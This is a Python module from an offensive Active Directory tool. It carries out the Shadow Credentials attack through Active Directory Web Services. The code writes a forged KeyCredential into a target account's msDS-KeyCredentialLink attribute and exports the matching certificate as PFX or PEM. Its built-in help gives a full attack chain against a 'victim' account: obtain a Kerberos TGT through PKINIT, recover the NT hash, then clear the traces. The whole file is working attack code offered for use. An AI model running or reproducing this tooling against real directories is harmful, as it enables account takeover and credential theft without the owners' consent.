#!/usr/bin/env python3

import random
import string
import logging
from base64 import b64decode, b64encode
from typing import Optional, List, Tuple
from uuid import uuid4

# DSInternals for KeyCredential handling
try:
    from dsinternals.common.data.DNWithBinary import DNWithBinary
    from dsinternals.common.data.hello.KeyCredential import KeyCredential
    from dsinternals.system.Guid import Guid
    from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
    from dsinternals.system.DateTime import DateTime
    DSINTERNALS_AVAILABLE = True
except ImportError:
    DSINTERNALS_AVAILABLE = False
    logging.warning("dsinternals not available. Install with: pip install dsinternals")

# Cryptography for PFX export
try:
    from cryptography import x509
    from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
    from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption, load_pem_private_key
    from cryptography.hazmat.backends import default_backend
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False


from src.adws import ADWSAuthType, ADWSConnect, ADWSReferralError
from src.ad_dns_manager_adws import _pull_with_referral_follow
from src.soap_templates import NAMESPACES


SHADOW_CREDS_HELP = """

  List KeyCredentials:
    soapy domain/user:'pass'@dc --shadow-creds list --shadow-target victim

  Add KeyCredential (generates certificate):
    soapy domain/user:'pass'@dc --shadow-creds add --shadow-target victim
    soapy domain/user:'pass'@dc --shadow-creds add --shadow-target victim --cert-export PEM
    soapy domain/user:'pass'@dc --shadow-creds add --shadow-target victim --cert-password MyPass123
    soapy domain/user:'pass'@dc --shadow-creds add --shadow-target victim --cert-filename mycert

  Remove specific KeyCredential:
    soapy domain/user:'pass'@dc --shadow-creds remove --shadow-target victim --device-id <ID>

  Clear all KeyCredentials:
    soapy domain/user:'pass'@dc --shadow-creds clear --shadow-target victim

  Show KeyCredential info:
    soapy domain/user:'pass'@dc --shadow-creds info --shadow-target victim --device-id <ID>

OPTIONS
-------
  --shadow-creds ACTION    Action: list, add, remove, clear, info
  --shadow-target TARGET   Target account (sAMAccountName)
  --device-id ID           DeviceID (required for remove/info)
  --cert-filename NAME     Output filename (random if not set)
  --cert-export TYPE       PEM or PFX (default: PFX)
  --cert-password PASS     PFX password (random if not set)

POST-EXPLOITATION
-----------------
  After adding a KeyCredential, use PKINITtools to get a TGT:

  # With PFX:
  python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass <pass> domain/user user.ccache

  # With PEM:
  python3 gettgtpkinit.py -cert-pem cert_cert.pem -key-pem cert_priv.pem domain/user user.ccache

  # Get NT hash:
  python3 getnthash.py -key <session-key> domain/user

FULL ATTACK EXAMPLE
-------------------
  # 1. List existing KeyCredentials
  soapy lab.local/attacker:'P@ss'@10.0.0.1 --shadow-creds list --shadow-target victim

  # 2. Add new KeyCredential
  soapy lab.local/attacker:'P@ss'@10.0.0.1 --shadow-creds add --shadow-target victim

  # 3. Get TGT
  python3 gettgtpkinit.py -cert-pfx <file>.pfx -pfx-pass <pass> lab.local/victim victim.ccache

  # 4. Get NT hash
  export KRB5CCNAME=victim.ccache
  python3 getnthash.py -key <key> lab.local/victim

  # 5. Cleanup
  soapy lab.local/attacker:'P@ss'@10.0.0.1 --shadow-creds clear --shadow-target victim

COMMON ERRORS
-------------
  KDC_ERR_PADATA_TYPE_NOSUPP  -> DC has no certificate (need AD CS/PKI)
  dsinternals not available   -> pip install dsinternals
  Insufficient rights         -> Check ACLs with BloodHound

REFERENCES
----------
  - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
  - https://github.com/ShutdownRepo/pywhisker
  - https://github.com/dirkjanm/PKINITtools

"""


def print_shadow_creds_help():
    """Print the Shadow Credentials help message."""
    print(SHADOW_CREDS_HELP)


def check_dependencies():
    """Check if required dependencies are available."""
    if not DSINTERNALS_AVAILABLE:
        raise ImportError(
            "dsinternals is required for Shadow Credentials operations. "
            "Install with: pip install dsinternals"
        )


def export_pfx(pem_cert_file: str, pem_key_file: str, pfx_password: Optional[str], out_file: str):
    """
    Export PEM certificate and key to PFX format.
    
    Args:
        pem_cert_file: Path to PEM certificate file
        pem_key_file: Path to PEM private key file
        pfx_password: Password for the PFX file (None for no password)
        out_file: Output PFX file path
    """
    if not CRYPTOGRAPHY_AVAILABLE:
        raise ImportError("cryptography library required for PFX export")
    
    with open(pem_cert_file, 'rb') as f:
        pem_cert_data = f.read()
    with open(pem_key_file, 'rb') as f:
        pem_key_data = f.read()

    cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
    key_obj = load_pem_private_key(pem_key_data, password=None, backend=default_backend())

    if pfx_password is None:
        encryption_algo = NoEncryption()
    else:
        encryption_algo = BestAvailableEncryption(pfx_password.encode('utf-8'))

    pfx_data = serialize_key_and_certificates(
        name=b"ShadowCredentialCert",
        key=key_obj,
        cert=cert_obj,
        cas=None,
        encryption_algorithm=encryption_algo
    )

    with open(out_file, 'wb') as f:
        f.write(pfx_data)


class ShadowCredentialsADWS:
    """
    Shadow Credentials management via ADWS.
    
    This class provides methods to manipulate the msDS-KeyCredentialLink
    attribute of AD objects using ADWS (Active Directory Web Services).
    """
    
    def __init__(
        self,
        ip: str,
        domain: str,
        username: str,
        auth: ADWSAuthType,
        target_samname: str,
    ):
        """
        Initialize Shadow Credentials manager.
        
        Args:
            ip: IP address of the domain controller
            domain: Domain name (FQDN)
            username: Username for authentication
            auth: ADWSAuthType object with credentials
            target_samname: SAM account name of the target object
        """
        check_dependencies()
        
        self.ip = ip
        self.domain = domain
        self.username = username
        self.auth = auth
        self.target_samname = target_samname
        self.target_dn: Optional[str] = None
        
    def _get_target_dn(self) -> str:
        """Get the distinguished name of the target account."""
        if self.target_dn:
            return self.target_dn
            
        # Query for the target account
        query = f"(sAMAccountName={self.target_samname})"
        pull_client = ADWSConnect.pull_client(self.ip, self.domain, self.username, self.auth)
        
        et = _pull_with_referral_follow(
            pull_client, query, None,
            ["distinguishedName"],
        )
        
        # Search in both user and computer objects
        for tag in [".//addata:user", ".//addata:computer"]:
            for item in et.findall(tag, namespaces=NAMESPACES):
                dn_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
                if dn_elem is not None and dn_elem.text:
                    self.target_dn = dn_elem.text
                    return self.target_dn
        
        raise RuntimeError(f"Target account '{self.target_samname}' not found in AD")
    
    def _get_keycredentials(self) -> Tuple[str, List[bytes]]:
        """
        Get current KeyCredentials from the target.
        
        Returns:
            Tuple of (target_dn, list of raw KeyCredential values)
        """
        target_dn = self._get_target_dn()
        
        query = f"(distinguishedName={target_dn})"
        pull_client = ADWSConnect.pull_client(self.ip, self.domain, self.username, self.auth)
        
        et = _pull_with_referral_follow(
            pull_client, query, target_dn,
            ["msDS-KeyCredentialLink", "distinguishedName"],
        )
        
        raw_credentials = []
        
        # Find KeyCredentialLink values
        for value_elem in et.findall(".//addata:msDS-KeyCredentialLink/ad:value", namespaces=NAMESPACES):
            if value_elem is not None and value_elem.text:
                try:
                    raw_credentials.append(value_elem.text.encode('utf-8'))
                except Exception:
                    pass
        
        return target_dn, raw_credentials
    
    def list(self) -> List[dict]:
        """
        List all KeyCredentials for the target.
        
        Returns:
            List of dicts with DeviceId and CreationTime
        """
        print(f"[*] Searching for target account: {self.target_samname}")
        
        try:
            target_dn, raw_credentials = self._get_keycredentials()
            print(f"[+] Target found: {target_dn}")
        except Exception as e:
            print(f"[-] Error: {e}")
            return []
        
        if not raw_credentials:
            print("[*] No KeyCredentials found (attribute is empty or no read permissions)")
            return []
        
        results = []
        print(f"[*] Listing KeyCredentials for {self.target_samname}:")
        
        for raw_value in raw_credentials:
            try:
                kc = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(raw_value))
                device_id = kc.DeviceId.toFormatD() if kc.DeviceId else "N/A"
                creation_time = str(kc.CreationTime) if kc.CreationTime else "N/A"
                
                print(f"    DeviceID: {device_id} | Creation Time (UTC): {creation_time}")
                results.append({
                    "DeviceId": device_id,
                    "CreationTime": creation_time
                })
            except Exception as e:
                print(f"    [!] Failed to parse KeyCredential: {e}")
        
        return results
    
    def info(self, device_id: str) -> Optional[dict]:
        """
        Show detailed info about a specific KeyCredential.
        
        Args:
            device_id: The DeviceID of the KeyCredential to inspect
            
        Returns:
            Dict with KeyCredential details or None if not found
        """
        print(f"[*] Searching for target account: {self.target_samname}")
        
        try:
            target_dn, raw_credentials = self._get_keycredentials()
            print(f"[+] Target found: {target_dn}")
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
        
        for raw_value in raw_credentials:
            try:
                kc = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(raw_value))
                if kc.DeviceId and kc.DeviceId.toFormatD() == device_id:
                    print(f"[+] Found KeyCredential with DeviceID: {device_id}")
                    kc.show()
                    return kc.toDict() if hasattr(kc, 'toDict') else {"DeviceId": device_id}
            except Exception as e:
                continue
        
        print(f"[-] No KeyCredential found with DeviceID: {device_id}")
        return None
    
    def add(
        self,
        filename: Optional[str] = None,
        export_type: str = "PFX",
        pfx_password: Optional[str] = None,
    ) -> bool:
        """
        Add a new KeyCredential to the target.
        
        Args:
            filename: Base filename for certificate output (random if None)
            export_type: "PEM" or "PFX"
            pfx_password: Password for PFX file (random if None)
            
        Returns:
            True if successful
        """
        print(f"[*] Searching for target account: {self.target_samname}")
        
        try:
            target_dn = self._get_target_dn()
            print(f"[+] Target found: {target_dn}")
        except Exception as e:
            print(f"[-] Error finding target: {e}")
            return False
        
        # Generate certificate
        print("[*] Generating certificate...")
        certificate = X509Certificate2(
            subject=self.target_samname,
            keySize=2048,
            notBefore=(-40*365),
            notAfter=(40*365)
        )
        print("[+] Certificate generated")
        
        # Generate KeyCredential
        print("[*] Generating KeyCredential...")
        key_credential = KeyCredential.fromX509Certificate2(
            certificate=certificate,
            deviceId=Guid(),
            owner=target_dn,
            currentTime=DateTime()
        )
        device_id = key_credential.DeviceId.toFormatD()
        print(f"[+] KeyCredential generated with DeviceID: {device_id}")
        
        # Get current KeyCredentials
        _, raw_credentials = self._get_keycredentials()
        
        # Add new KeyCredential
        new_kc_value = key_credential.toDNWithBinary().toString()
        
        # Use ADWS Put to update the attribute
        print(f"[*] Updating msDS-KeyCredentialLink attribute...")
        
        put_client = ADWSConnect.put_client(self.ip, self.domain, self.username, self.auth)
        
        try:
            put_client.put(
                object_ref=target_dn,
                operation="add",
                attribute="addata:msDS-KeyCredentialLink",
                data_type="string",
                value=new_kc_value,
            )
            print("[+] Successfully updated msDS-KeyCredentialLink")
        except Exception as e:
            print(f"[-] Failed to update attribute: {e}")
            return False
        
        # Export certificate
        if filename is None:
            filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
            print(f"[*] No filename provided, using: {filename}")
        
        if export_type.upper() == "PEM":
            certificate.ExportPEM(path_to_files=filename)
            print(f"[+] Saved PEM certificate: {filename}_cert.pem")
            print(f"[+] Saved PEM private key: {filename}_priv.pem")
            print(f"\n[*] To obtain a TGT, run:")
            print(f"    python3 gettgtpkinit.py -cert-pem {filename}_cert.pem -key-pem {filename}_priv.pem {self.domain}/{self.target_samname} {filename}.ccache")
        
        elif export_type.upper() == "PFX":
            if pfx_password is None:
                pfx_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))
                print(f"[*] No password provided, using: {pfx_password}")
            
            # Export to PEM first, then convert to PFX
            certificate.ExportPEM(path_to_files=filename)
            pem_cert_file = f"{filename}_cert.pem"
            pem_key_file = f"{filename}_priv.pem"
            pfx_file = f"{filename}.pfx"
            
            export_pfx(pem_cert_file, pem_key_file, pfx_password, pfx_file)
            
            print(f"[+] Saved PFX certificate: {pfx_file}")
            print(f"[+] PFX password: {pfx_password}")
            
        return True
    
    def remove(self, device_id: str) -> bool:
        """
        Remove a specific KeyCredential by DeviceID.
        
        Args:
            device_id: The DeviceID of the KeyCredential to remove
            
        Returns:
            True if successful
        """
        print(f"[*] Searching for target account: {self.target_samname}")
        
        try:
            target_dn, raw_credentials = self._get_keycredentials()
            print(f"[+] Target found: {target_dn}")
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
        
        # Find the KeyCredential to remove
        kc_to_remove = None
        remaining_credentials = []
        
        for raw_value in raw_credentials:
            try:
                kc = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(raw_value))
                if kc.DeviceId and kc.DeviceId.toFormatD() == device_id:
                    kc_to_remove = raw_value
                    print(f"[+] Found KeyCredential to remove: {device_id}")
                else:
                    remaining_credentials.append(raw_value)
            except Exception:
                remaining_credentials.append(raw_value)
        
        if kc_to_remove is None:
            print(f"[-] No KeyCredential found with DeviceID: {device_id}")
            return False
        
        # Remove the KeyCredential using ADWS Put (delete operation)
        put_client = ADWSConnect.put_client(self.ip, self.domain, self.username, self.auth)
        
        try:
            put_client.put(
                object_ref=target_dn,
                operation="delete",
                attribute="addata:msDS-KeyCredentialLink",
                data_type="string",
                value=kc_to_remove.decode('utf-8') if isinstance(kc_to_remove, bytes) else kc_to_remove,
            )
            print(f"[+] Successfully removed KeyCredential with DeviceID: {device_id}")
            return True
        except Exception as e:
            print(f"[-] Failed to remove KeyCredential: {e}")
            return False
    
    def clear(self) -> bool:
        """
        Remove all KeyCredentials from the target.
        
        Returns:
            True if successful
        """
        print(f"[*] Searching for target account: {self.target_samname}")
        
        try:
            target_dn, raw_credentials = self._get_keycredentials()
            print(f"[+] Target found: {target_dn}")
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
        
        if not raw_credentials:
            print("[*] msDS-KeyCredentialLink is already empty")
            return True
        
        print(f"[*] Clearing {len(raw_credentials)} KeyCredential(s)...")
        
        put_client = ADWSConnect.put_client(self.ip, self.domain, self.username, self.auth)
        
        # Remove each KeyCredential
        for raw_value in raw_credentials:
            try:
                put_client.put(
                    object_ref=target_dn,
                    operation="delete",
                    attribute="addata:msDS-KeyCredentialLink",
                    data_type="string",
                    value=raw_value.decode('utf-8') if isinstance(raw_value, bytes) else raw_value,
                )
            except Exception as e:
                print(f"[!] Warning: Failed to remove one KeyCredential: {e}")
        
        print("[+] msDS-KeyCredentialLink cleared successfully")
        return True

def shadow_credentials_list(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
):
    """List KeyCredentials for a target account."""
    sc = ShadowCredentialsADWS(ip, domain, username, auth, target)
    sc.list()


def shadow_credentials_add(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    filename: Optional[str] = None,
    export_type: str = "PFX",
    pfx_password: Optional[str] = None,
):
    """Add a KeyCredential to a target account."""
    sc = ShadowCredentialsADWS(ip, domain, username, auth, target)
    sc.add(filename=filename, export_type=export_type, pfx_password=pfx_password)


def shadow_credentials_remove(
    target: str,
    device_id: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
):
    """Remove a specific KeyCredential from a target account."""
    sc = ShadowCredentialsADWS(ip, domain, username, auth, target)
    sc.remove(device_id)


def shadow_credentials_clear(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
):
    """Clear all KeyCredentials from a target account."""
    sc = ShadowCredentialsADWS(ip, domain, username, auth, target)
    sc.clear()


def shadow_credentials_info(
    target: str,
    device_id: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
):
    """Show info about a specific KeyCredential."""
    sc = ShadowCredentialsADWS(ip, domain, username, auth, target)
    sc.info(device_id)
